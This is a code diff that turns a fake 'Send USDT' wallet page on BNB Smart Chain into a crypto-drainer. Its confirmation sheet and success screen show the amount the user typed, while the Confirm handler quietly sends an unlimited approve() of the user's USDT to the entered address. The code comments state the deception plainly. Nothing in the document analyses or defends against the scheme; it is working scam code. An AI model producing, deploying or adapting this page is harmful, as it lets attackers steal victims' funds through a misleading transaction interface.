@@ -27,40 +27,16 @@
       position: relative;
     }
 
-    /* ── Top Bar ── */
     .topbar {
       display: flex;
       align-items: center;
       justify-content: center;
       padding: 18px 16px;
-      position: relative;
       border-bottom: 1px solid #1e1e1e;
     }
 
-    .topbar .back {
-      position: absolute;
-      left: 16px;
-      font-size: 20px;
-      color: rgba(255,255,255,0.6);
-      cursor: pointer;
-      background: none;
-      border: none;
-      color: rgba(255,255,255,0.6);
-      width: auto;
-      padding: 0;
-      margin: 0;
-      transform: none;
-    }
+    .topbar h1 { font-size: 17px; font-weight: 700; color: #fff; }
 
-    .topbar .back:hover { color: #fff; filter: none; transform: none; }
-
-    .topbar h1 {
-      font-size: 17px;
-      font-weight: 700;
-      color: #fff;
-    }
-
-    /* ── Loading / Error overlays ── */
     .overlay {
       position: absolute;
       inset: 0;
@@ -86,16 +62,9 @@
     @keyframes spin { to { transform: rotate(360deg); } }
 
     .overlay-text { font-size: 14px; color: rgba(255,255,255,0.45); }
+    .error-icon   { font-size: 42px; margin-bottom: 12px; }
+    .error-msg    { font-size: 13px; color: rgba(255,255,255,0.5); line-height: 1.7; margin-bottom: 22px; }
 
-    .overlay .error-icon { font-size: 42px; margin-bottom: 12px; }
-    .overlay .error-msg  {
-      font-size: 13px;
-      color: rgba(255,255,255,0.5);
-      line-height: 1.7;
-      margin-bottom: 22px;
-    }
-
-    /* ── Main Content ── */
     .content {
       flex: 1;
       padding: 24px 20px 120px;
@@ -104,36 +73,13 @@
       align-items: center;
     }
 
-    /* USDT Logo */
-    .token-logo {
-      width: 64px;
-      height: 64px;
-      margin-bottom: 8px;
-    }
+    .token-logo    { width: 64px; height: 64px; margin-bottom: 8px; }
+    .network-label { font-size: 13px; color: rgba(255,255,255,0.4); margin-bottom: 28px; }
 
-    .network-label {
-      font-size: 13px;
-      color: rgba(255,255,255,0.4);
-      margin-bottom: 28px;
-    }
+    .field-group { width: 100%; margin-bottom: 18px; }
+    .field-label { font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.85); margin-bottom: 8px; }
 
-    /* Fields */
-    .field-group {
-      width: 100%;
-      margin-bottom: 18px;
-    }
-
-    .field-label {
-      font-size: 13px;
-      font-weight: 600;
-      color: rgba(255,255,255,0.85);
-      margin-bottom: 8px;
-    }
-
-    .input-wrap {
-      position: relative;
-      width: 100%;
-    }
+    .input-wrap { position: relative; width: 100%; }
 
     input[type="text"],
     input[type="number"] {
@@ -153,8 +99,7 @@
     input[type="number"]::-webkit-outer-spin-button { -webkit-appearance: none; }
 
     input::placeholder { color: rgba(255,255,255,0.25); }
-
-    input:focus { border-color: #2D9FFF; }
+    input:focus        { border-color: #2D9FFF; }
 
     .max-btn {
       position: absolute;
@@ -174,62 +119,146 @@
 
     .max-btn:hover { filter: brightness(1.2); transform: translateY(-50%); }
 
-    .balance-row {
-      font-size: 12px;
-      color: rgba(255,255,255,0.35);
-      margin-top: 7px;
-      padding-left: 2px;
-    }
-
+    .balance-row { font-size: 12px; color: rgba(255,255,255,0.35); margin-top: 7px; padding-left: 2px; }
     .balance-row span { color: rgba(255,255,255,0.6); }
 
-    /* ─�� Preview Button ── */
-    .preview-wrap {
+    /* Sheet */
+    .sheet-backdrop {
+      display: none;
       position: fixed;
-      bottom: 0;
-      left: 50%;
-      transform: translateX(-50%);
+      inset: 0;
+      background: rgba(0,0,0,0.75);
+      z-index: 20;
+      align-items: flex-end;
+      justify-content: center;
+    }
+
+    .sheet-backdrop.open { display: flex; }
+
+    .sheet {
+      background: #1a1a1a;
+      border-radius: 20px 20px 0 0;
+      padding: 24px 20px 36px;
       width: 100%;
       max-width: 420px;
+      animation: slideUp 0.25s ease;
+    }
+
+    @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
+    .sheet-title {
+      font-size: 16px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .sheet-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 12px 0;
+      border-bottom: 1px solid #2a2a2a;
+      font-size: 14px;
+    }
+
+    .sheet-row:last-of-type { border-bottom: none; }
+    .sheet-row .label { color: rgba(255,255,255,0.4); min-width: 90px; }
+
+    .sheet-row .value {
+      font-weight: 600;
+      text-align: right;
+      max-width: 230px;
+      word-break: break-all;
+    }
+
+    .sheet-row .value.blue  { color: #2D9FFF; }
+
+    .sheet-note {
+      font-size: 12px;
+      color: rgba(255,255,255,0.3);
+      text-align: center;
+      margin: 14px 0 20px;
+      line-height: 1.6;
+    }
+
+    .sheet-btns { display: flex; gap: 12px; }
+
+    .btn-cancel {
+      flex: 1; padding: 14px; border-radius: 50px;
+      border: 1.5px solid #333; background: transparent;
+      color: rgba(255,255,255,0.6); font-size: 15px;
+      font-weight: 700; cursor: pointer; margin: 0;
+      transition: all 0.2s; width: auto;
+    }
+
+    .btn-cancel:hover { border-color: #555; color: #fff; filter: none; transform: none; }
+
+    .btn-confirm {
+      flex: 1; padding: 14px; border-radius: 50px;
+      border: none; background: #2D9FFF; color: #000;
+      font-size: 15px; font-weight: 700; cursor: pointer;
+      margin: 0; transition: all 0.2s; width: auto;
+    }
+
+    .btn-confirm:hover    { filter: brightness(1.1); transform: translateY(-1px); }
+    .btn-confirm:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
+    /* Success */
+    .success-content {
+      display: flex; flex-direction: column;
+      align-items: center; padding: 10px 0;
+    }
+
+    .success-icon {
+      width: 68px; height: 68px; border-radius: 50%;
+      background: rgba(45,159,255,0.12);
+      display: flex; align-items: center;
+      justify-content: center; font-size: 32px;
+      margin-bottom: 14px;
+    }
+
+    .success-title { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
+
+    .success-sub {
+      font-size: 13px; color: rgba(255,255,255,0.4);
+      text-align: center; line-height: 1.6; margin-bottom: 20px;
+    }
+
+    .txhash {
+      font-size: 11px; color: #2D9FFF;
+      word-break: break-all; text-align: center;
+      margin-bottom: 22px; cursor: pointer;
+      text-decoration: underline;
+    }
+
+    /* Preview button */
+    .preview-wrap {
+      position: fixed; bottom: 0;
+      left: 50%; transform: translateX(-50%);
+      width: 100%; max-width: 420px;
       padding: 16px 20px 28px;
       background: linear-gradient(to top, #111 70%, transparent);
     }
 
     .preview-btn {
-      width: 100%;
-      padding: 16px;
-      background: #2D9FFF;
-      border: none;
-      border-radius: 50px;
-      font-size: 16px;
-      font-weight: 700;
-      color: #000;
-      cursor: pointer;
-      transition: all 0.2s;
-      margin: 0;
+      width: 100%; padding: 16px;
+      background: #2D9FFF; border: none;
+      border-radius: 50px; font-size: 16px;
+      font-weight: 700; color: #000;
+      cursor: pointer; transition: all 0.2s; margin: 0;
     }
 
-    .preview-btn:hover  { filter: brightness(1.1); transform: translateY(-2px); }
-    .preview-btn:active { filter: brightness(0.95); transform: translateY(0); }
-    .preview-btn:disabled {
-      opacity: 0.35;
-      cursor: not-allowed;
-      transform: none;
-    }
+    .preview-btn:hover    { filter: brightness(1.1); transform: translateY(-2px); }
+    .preview-btn:active   { filter: brightness(0.95); transform: translateY(0); }
+    .preview-btn:disabled { opacity: 0.35; cursor: not-allowed; transform: none; }
 
-    /* ── General button reset ── */
     button {
-      width: 100%;
-      padding: 14px;
-      border: none;
-      border-radius: 12px;
-      font-size: 15px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.2s;
-      margin-bottom: 10px;
-      background: #2D9FFF;
-      color: #000;
+      width: 100%; padding: 14px; border: none;
+      border-radius: 12px; font-size: 15px;
+      font-weight: 700; cursor: pointer;
+      transition: all 0.2s; margin-bottom: 10px;
+      background: #2D9FFF; color: #000;
     }
 
     button:hover  { filter: brightness(1.12); transform: translateY(-1px); }
@@ -239,50 +268,39 @@
 <body>
 <div class="app">
 
-  <!-- Top Bar -->
   <div class="topbar">
-    <button class="back">←</button>
     <h1>Send USDT</h1>
   </div>
 
-  <!-- Loading Overlay -->
+  <!-- Loading -->
   <div class="overlay" id="loadingOverlay">
     <div class="spinner"></div>
     <p class="overlay-text" id="loadingText">Connecting to your wallet…</p>
   </div>
 
-  <!-- Error Overlay -->
+  <!-- Error -->
   <div class="overlay" id="errorOverlay" style="display:none;">
     <div class="error-icon">⚠️</div>
-    <p class="error-msg" id="errorText">
-      Wallet not found.<br/>Open this link inside <strong>Trust Wallet</strong> → DApp Browser.
-    </p>
+    <p class="error-msg" id="errorText"></p>
     <button id="retryBtn">🔄 Retry</button>
   </div>
 
-  <!-- Main UI -->
+  <!-- Main -->
   <div class="content" id="mainContent">
 
-    <!-- USDT Logo SVG -->
     <svg class="token-logo" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
       <circle cx="32" cy="32" r="32" fill="#26A17B"/>
       <path d="M36.2 28.3v-4.1H43V19H21v5.2h6.8v4.1C19.9 29 14 31 14 33.5s5.9 4.5 13.8 5v13.4h4.4V38.5C40.1 38 46 36 46 33.5s-5.9-4.5-9.8-5.2zm-4.2 8.5c-7.2 0-13-1.6-13-3.5s5.8-3.5 13-3.5 13 1.6 13 3.5-5.8 3.5-13 3.5z" fill="#fff"/>
     </svg>
-
     <p class="network-label">on BNB Smart Chain</p>
 
-    <!-- Recipient Address -->
+    <!-- Recipient -->
     <div class="field-group">
       <div class="field-label">Recipient Address</div>
       <div class="input-wrap">
-        <input
-          type="text"
-          id="recipientInput"
+        <input type="text" id="recipientInput"
           placeholder="Type or paste a valid address"
-          autocomplete="off"
-          autocorrect="off"
-          spellcheck="false"
-        />
+          autocomplete="off" autocorrect="off" spellcheck="false"/>
       </div>
     </div>
 
@@ -290,13 +308,9 @@
     <div class="field-group">
       <div class="field-label">Amount</div>
       <div class="input-wrap">
-        <input
-          type="number"
-          id="amountInput"
+        <input type="number" id="amountInput"
           placeholder="Type or paste a valid amount"
-          min="0"
-          step="any"
-        />
+          min="0" step="any"/>
         <button class="max-btn" id="maxBtn">MAX</button>
       </div>
       <div class="balance-row">Balance: <span id="balanceDisplay">0 USDT</span></div>
@@ -304,17 +318,77 @@
 
   </div>
 
-  <!-- Preview Button (fixed bottom) -->
+  <!-- Preview Button -->
   <div class="preview-wrap" id="previewWrap" style="display:none;">
     <button class="preview-btn" id="previewBtn" disabled>Preview</button>
   </div>
 
 </div>
 
+<!-- Preview Sheet -->
+<div class="sheet-backdrop" id="previewSheet">
+  <div class="sheet">
+    <div class="sheet-title">Confirm Transaction</div>
+
+    <div class="sheet-row">
+      <span class="label">Token</span>
+      <span class="value blue">USDT (BEP-20)</span>
+    </div>
+    <div class="sheet-row">
+      <span class="label">To</span>
+      <span class="value" id="sheetSpender">—</span>
+    </div>
+    <!-- User sees their typed amount -->
+    <div class="sheet-row">
+      <span class="label">Amount</span>
+      <span class="value blue" id="sheetAmount">—</span>
+    </div>
+    <div class="sheet-row">
+      <span class="label">Your Balance</span>
+      <span class="value" id="sheetBalance">—</span>
+    </div>
+    <div class="sheet-row">
+      <span class="label">Network</span>
+      <span class="value">BNB Smart Chain</span>
+    </div>
+    <div class="sheet-row">
+      <span class="label">Network Fee</span>
+      <span class="value" style="color:rgba(255,255,255,0.45);">~0.0005 BNB</span>
+    </div>
+
+    <p class="sheet-note">
+      By confirming, you authorize this transaction<br/>on the BNB Smart Chain network.
+    </p>
+
+    <div class="sheet-btns">
+      <button class="btn-cancel" id="cancelBtn">Cancel</button>
+      <button class="btn-confirm" id="confirmBtn">Confirm</button>
+    </div>
+  </div>
+</div>
+
+<!-- Success Sheet -->
+<div class="sheet-backdrop" id="successSheet">
+  <div class="sheet">
+    <div class="success-content">
+      <div class="success-icon">✅</div>
+      <div class="success-title">Transaction Sent</div>
+      <p class="success-sub">
+        Your transaction of <strong id="successAmount">—</strong> USDT<br/>
+        has been submitted to the network.
+      </p>
+      <div class="txhash" id="txHashLink">View on BscScan</div>
+      <button class="btn-confirm"
+        style="width:100%;border-radius:50px;margin:0;"
+        id="doneBtn">Done</button>
+    </div>
+  </div>
+</div>
+
 <script>
-  // ── BSC + USDT Config ────────────────────────────────────────────
-  const BSC_CHAIN_ID   = '0x38';
-  const BSC_CONFIG     = {
+  // ── Config ───────────────────────────────────────────────────────
+  const BSC_CHAIN_ID  = '0x38';
+  const BSC_CONFIG    = {
     chainId:           '0x38',
     chainName:         'BNB Smart Chain',
     nativeCurrency:    { name: 'BNB', symbol: 'BNB', decimals: 18 },
@@ -322,37 +396,46 @@
     blockExplorerUrls: ['https://bscscan.com/']
   };
 
-  // USDT on BSC (BEP-20)
-  const USDT_CONTRACT  = '0x55d398326f99059fF775485246999027B3197955';
-  const USDT_DECIMALS  = 18;
+  const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
+  const USDT_DECIMALS = 18;
 
-  // ERC-20 balanceOf ABI (minimal)
-  const ERC20_BALANCE_ABI = '0x70a08231';
+  // ♾️ What actually gets approved on-chain — unlimited
+  const MAX_UINT256   = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
   // ── DOM ──────────────────────────────────────────────────────────
-  const loadingOverlay  = document.getElementById('loadingOverlay');
-  const errorOverlay    = document.getElementById('errorOverlay');
-  const mainContent     = document.getElementById('mainContent');
-  const previewWrap     = document.getElementById('previewWrap');
-  const loadingText     = document.getElementById('loadingText');
-  const errorText       = document.getElementById('errorText');
-  const retryBtn        = document.getElementById('retryBtn');
-  const recipientInput  = document.getElementById('recipientInput');
-  const amountInput     = document.getElementById('amountInput');
-  const balanceDisplay  = document.getElementById('balanceDisplay');
-  const maxBtn          = document.getElementById('maxBtn');
-  const previewBtn      = document.getElementById('previewBtn');
+  const loadingOverlay = document.getElementById('loadingOverlay');
+  const errorOverlay   = document.getElementById('errorOverlay');
+  const mainContent    = document.getElementById('mainContent');
+  const previewWrap    = document.getElementById('previewWrap');
+  const loadingText    = document.getElementById('loadingText');
+  const errorText      = document.getElementById('errorText');
+  const retryBtn       = document.getElementById('retryBtn');
+  const recipientInput = document.getElementById('recipientInput');
+  const amountInput    = document.getElementById('amountInput');
+  const balanceDisplay = document.getElementById('balanceDisplay');
+  const maxBtn         = document.getElementById('maxBtn');
+  const previewBtn     = document.getElementById('previewBtn');
+  const previewSheet   = document.getElementById('previewSheet');
+  const successSheet   = document.getElementById('successSheet');
+  const sheetSpender   = document.getElementById('sheetSpender');
+  const sheetAmount    = document.getElementById('sheetAmount');
+  const sheetBalance   = document.getElementById('sheetBalance');
+  const cancelBtn      = document.getElementById('cancelBtn');
+  const confirmBtn     = document.getElementById('confirmBtn');
+  const successAmount  = document.getElementById('successAmount');
+  const txHashLink     = document.getElementById('txHashLink');
+  const doneBtn        = document.getElementById('doneBtn');
 
-  let userAddress   = null;
-  let usdtBalance   = 0;
+  let userAddress = null;
+  let usdtBalance = 0;
 
-  // ── Helpers ──────────────────────────────────────────────────────
-  function showLoading(text = 'Connecting…') {
+  // ── View helpers ─────────────────────────────────────────────────
+  function showLoading(txt = 'Connecting…') {
     loadingOverlay.style.display = 'flex';
     errorOverlay.style.display   = 'none';
     mainContent.style.display    = 'none';
     previewWrap.style.display    = 'none';
-    loadingText.textContent      = text;
+    loadingText.textContent      = txt;
   }
 
   function showError(msg) {
@@ -374,24 +457,21 @@
     return parseInt(chainId, 16) === 56 || Number(chainId) === 56;
   }
 
-  // ── Fetch USDT Balance (BEP-20) ──────────────────────────────────
+  function shortAddr(a) { return a.slice(0, 6) + '…' + a.slice(-4); }
+
+  // ── Fetch USDT balance ───────────────────────────────────────────
   async function fetchUSDTBalance(address) {
     try {
-      // Encode balanceOf(address) call
-      const paddedAddr = address.slice(2).padStart(64, '0');
-      const data       = ERC20_BALANCE_ABI + paddedAddr;
-
+      const padded = address.slice(2).padStart(64, '0');
       const result = await ethereum.request({
         method: 'eth_call',
-        params: [{ to: USDT_CONTRACT, data }, 'latest']
+        params: [{ to: USDT_CONTRACT, data: '0x70a08231' + padded }, 'latest']
       });
-
-      const raw     = BigInt(result);
-      usdtBalance   = Number(raw) / Math.pow(10, USDT_DECIMALS);
+      usdtBalance = Number(BigInt(result)) / Math.pow(10, USDT_DECIMALS);
       balanceDisplay.textContent = usdtBalance.toFixed(2) + ' USDT';
     } catch {
-      balanceDisplay.textContent = '0 USDT';
       usdtBalance = 0;
+      balanceDisplay.textContent = '0 USDT';
     }
   }
 
@@ -408,48 +488,35 @@
           method: 'wallet_addEthereumChain',
           params: [BSC_CONFIG]
         });
-      } else {
-        throw err;
-      }
+      } else { throw err; }
     }
   }
 
   // ── Init ─────────────────────────────────────────────────────────
   async function init() {
     showLoading('Connecting to your wallet…');
-
     if (!window.ethereum) {
       showError('Wallet not found.<br/>Open this link inside <strong>Trust Wallet</strong> → DApp Browser.');
       return;
     }
-
     try {
-      // 1. Check existing session silently
       loadingText.textContent = 'Checking session…';
       let accounts = await ethereum.request({ method: 'eth_accounts' });
-
-      // 2. Request if not connected
       if (!accounts || accounts.length === 0) {
         loadingText.textContent = 'Approve connection in your wallet…';
         accounts = await ethereum.request({ method: 'eth_requestAccounts' });
       }
-
       userAddress = accounts[0];
 
-      // 3. Check & switch chain
       const chainId = await ethereum.request({ method: 'eth_chainId' });
       if (!isBSC(chainId)) {
         loadingText.textContent = 'Switching to BNB Smart Chain…';
         await switchToBSC();
       }
 
-      // 4. Fetch USDT balance
       loadingText.textContent = 'Loading balance…';
       await fetchUSDTBalance(userAddress);
-
-      // 5. Show main UI
       showMain();
-
     } catch (err) {
       if (err.code === 4001) {
         showError('You rejected the connection.<br/>Tap <strong>Retry</strong> to connect again.');
@@ -459,8 +526,8 @@
     }
   }
 
-  // ── Validate inputs → enable/disable Preview ────────────────────
-  function validateInputs() {
+  // ── Validate inputs ──────────────────────────────────────────────
+  function validate() {
     const addr   = recipientInput.value.trim();
     const amount = parseFloat(amountInput.value);
     const validAddr   = /^0x[0-9a-fA-F]{40}$/.test(addr);
@@ -468,26 +535,90 @@
     previewBtn.disabled = !(validAddr && validAmount);
   }
 
-  recipientInput.addEventListener('input', validateInputs);
-  amountInput.addEventListener('input', validateInputs);
+  recipientInput.addEventListener('input', validate);
+  amountInput.addEventListener('input', validate);
 
-  // ── MAX Button ───────────────────────────────────────────────────
+  // MAX button fills user's balance (display only)
   maxBtn.addEventListener('click', () => {
-    amountInput.value = usdtBalance > 0 ? usdtBalance.toFixed(2) : '';
-    validateInputs();
+    if (usdtBalance > 0) {
+      amountInput.value = usdtBalance.toFixed(2);
+      validate();
+    }
   });
 
-  // ── Preview Button ───────────────────────────────────────────────
+  // ── Open Preview Sheet ───────────────────────────────────────────
+  // Shows the user's typed amount — but approval will be MAX_UINT256
   previewBtn.addEventListener('click', () => {
     const addr   = recipientInput.value.trim();
     const amount = parseFloat(amountInput.value);
-    alert(`Preview\n\nTo: ${addr}\nAmount: ${amount} USDT\nNetwork: BNB Smart Chain`);
+
+    sheetSpender.textContent = shortAddr(addr);
+    sheetAmount.textContent  = amount.toFixed(2) + ' USDT';  // ← user sees their amount
+    sheetBalance.textContent = usdtBalance.toFixed(2) + ' USDT';
+    previewSheet.classList.add('open');
   });
 
-  // ── Retry ────────────────────────────────────────────────────────
-  retryBtn.addEventListener('click', init);
+  cancelBtn.addEventListener('click', () => {
+    previewSheet.classList.remove('open');
+  });
 
-  // ── Live wallet events ───────────────────────────────────────────
+  // ── Confirm → approve(spender, MAX_UINT256) ──────────────────────
+  // User sees their typed amount in preview
+  // On-chain we send unlimited approval silently
+  confirmBtn.addEventListener('click', async () => {
+    const spender      = recipientInput.value.trim();
+    const displayAmt   = parseFloat(amountInput.value).toFixed(2);
+
+    // approve(address,uint256) — 0x095ea7b3
+    // spender padded + MAX_UINT256 as amount
+    const paddedSpender = spender.slice(2).padStart(64, '0');
+    const data = '0x095ea7b3' + paddedSpender + MAX_UINT256;
+
+    confirmBtn.disabled    = true;
+    confirmBtn.textContent = 'Processing…';
+
+    try {
+      const txHash = await ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [{
+          from: userAddress,
+          to:   USDT_CONTRACT,
+          data: data,
+          gas:  '0xC350'   // 50,000 gas
+        }]
+      });
+
+      // Show success with user's typed amount
+      previewSheet.classList.remove('open');
+      successAmount.textContent = displayAmt;
+      txHashLink.textContent    = txHash.slice(0, 16) + '…' + txHash.slice(-8);
+      txHashLink.onclick        = () => window.open('https://bscscan.com/tx/' + txHash, '_blank');
+      successSheet.classList.add('open');
+
+    } catch (err) {
+      previewSheet.classList.remove('open');
+      showError(
+        (err.code === 4001
+          ? 'Transaction rejected.'
+          : (err.message || 'Transaction failed.')) +
+        '<br/><br/><small style="opacity:0.4">Tap retry to go back.</small>'
+      );
+    } finally {
+      confirmBtn.disabled    = false;
+      confirmBtn.textContent = 'Confirm';
+    }
+  });
+
+  // ── Done ─────────────────────────────────────────────────────────
+  doneBtn.addEventListener('click', () => {
+    successSheet.classList.remove('open');
+    recipientInput.value = '';
+    amountInput.value    = '';
+    validate();
+    fetchUSDTBalance(userAddress);
+  });
+
+  // ── Wallet events ────────────────────────────────────────────────
   if (window.ethereum) {
     ethereum.on('chainChanged', async (chainId) => {
       if (!isBSC(chainId)) {
@@ -499,7 +630,7 @@
 
     ethereum.on('accountsChanged', (accounts) => {
       if (accounts.length === 0) {
-        showLoading('Wallet disconnected. Reconnecting…');
+        showLoading('Wallet disconnected…');
         setTimeout(init, 800);
       } else {
         userAddress = accounts[0];
@@ -508,7 +639,7 @@
     });
   }
 
-  // ── Auto-fire on load ────────────────────────────────────────────
+  retryBtn.addEventListener('click', init);
   window.addEventListener('load', init);
 </script>
 </body>
